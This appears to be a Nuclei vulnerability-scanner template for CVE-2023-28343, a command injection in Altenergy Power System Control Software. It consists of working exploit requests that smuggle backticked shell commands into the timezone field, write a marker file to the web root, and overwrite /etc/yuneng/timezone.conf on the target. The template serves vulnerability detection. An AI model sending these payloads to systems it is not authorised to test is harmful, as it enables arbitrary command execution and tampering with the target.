id: cve-2023-28343

info:
  name: Command Injection in Altenergy Power System Control Software
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Altenergy Power System Control Software C1.2.5 is vulnerable to a command injection flaw in the `/set_timezone` endpoint, allowing attackers to execute arbitrary commands and obtain server privileges.
  reference:
    - https://github.com/ahmedalroky/Disclosures/blob/main/apesystems/os_command_injection.md

variables:
  marker: "{{rand_int(10000, 99999)}}"

http:
  - raw:
      - |
        POST /index.php/management/set_timezone HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        timezone=`123|md5sum > {{marker}}.txt`
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "d41d8cd98f00b204e9800998ecf8427e"

  - raw:
      - |
        GET /{{marker}}.txt HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "d41d8cd98f00b204e9800998ecf8427e"

  - raw:
      - |
        POST /index.php/management/set_timezone HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        timezone=`echo Asia/Taipei > /etc/yuneng/timezone.conf`
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
